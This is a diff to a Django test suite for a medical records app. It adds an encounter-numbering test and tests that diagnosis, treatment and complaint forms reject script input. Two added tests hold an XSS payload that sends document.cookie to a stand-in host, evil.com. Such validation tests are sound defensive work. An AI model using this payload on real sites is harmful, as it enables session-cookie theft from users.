@@ -61,6 +61,18 @@ class MedicalSecurityTests(TestCase):
         self.assertNotIn("Rest and medication", record.treatmentPlan_encrypted)
         self.assertNotIn("Sensitive note", record.notes_encrypted)
 
+    def test_encounter_number_is_assigned_on_create(self):
+        self.encounter.refresh_from_db()
+
+        second_encounter = Encounter.objects.create(
+            patient=self.patient,
+            staff=self.doctor_staff,
+            complaint="Follow up",
+        )
+
+        self.assertEqual(self.encounter.encounterNumber, 1)
+        self.assertEqual(second_encounter.encounterNumber, 2)
+
     def test_doctor_can_decrypt_own_medical_record(self):
         self.client.login(username="doctor1", password="StrongPassword123!")
 
@@ -95,13 +107,13 @@ class MedicalSecurityTests(TestCase):
             reverse("medical_app:medical_record_detail", args=[record.id])
         )
 
-        self.assertEqual(response.status_code, 403)
+        self.assertRedirects(response, reverse("landing_page"))
 
     def test_doctor_can_create_medical_record_for_own_encounter(self):
         self.client.login(username="doctor1", password="StrongPassword123!")
 
         response = self.client.post(
-            reverse("medical_app:medical_record_create", args=[self.encounter.id]),
+            reverse("medical_app:medical_record_create", args=[self.encounter.pk]),
             {
                 "diagnosis": "Migraine",
                 "treatmentPlan": "Rest and medication",
@@ -114,6 +126,34 @@ class MedicalSecurityTests(TestCase):
         record = MedicalRecordEntry.objects.first()
         self.assertIsNotNone(record)
         self.assertNotIn("Migraine", record.diagnosis_encrypted)
+
+    def test_medical_record_form_rejects_script_payload_fields(self):
+        self.client.login(username="doctor1", password="StrongPassword123!")
+        payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
+
+        response = self.client.post(
+            reverse("medical_app:medical_record_create", args=[self.encounter.pk]),
+            {
+                "diagnosis": payload,
+                "treatmentPlan": payload,
+                "notes": payload,
+            },
+        )
+
+        self.assertEqual(response.status_code, 200)
+        self.assertContains(response, "Diagnosis hanya boleh")
+        self.assertContains(response, "Treatment plan hanya boleh")
+        self.assertContains(response, "Notes hanya boleh")
+        self.assertFalse(MedicalRecordEntry.objects.filter(encounter=self.encounter).exists())
+
+    def test_encounter_form_rejects_script_payload_complaint(self):
+        from .forms import EncounterForm
+
+        payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
+        form = EncounterForm(data={"complaint": payload})
+
+        self.assertFalse(form.is_valid())
+        self.assertIn("Complaint hanya boleh", str(form.errors))
 
     def test_invalid_uuid_payload_does_not_execute_sql_injection(self):
         self.client.login(username="doctor1", password="StrongPassword123!")
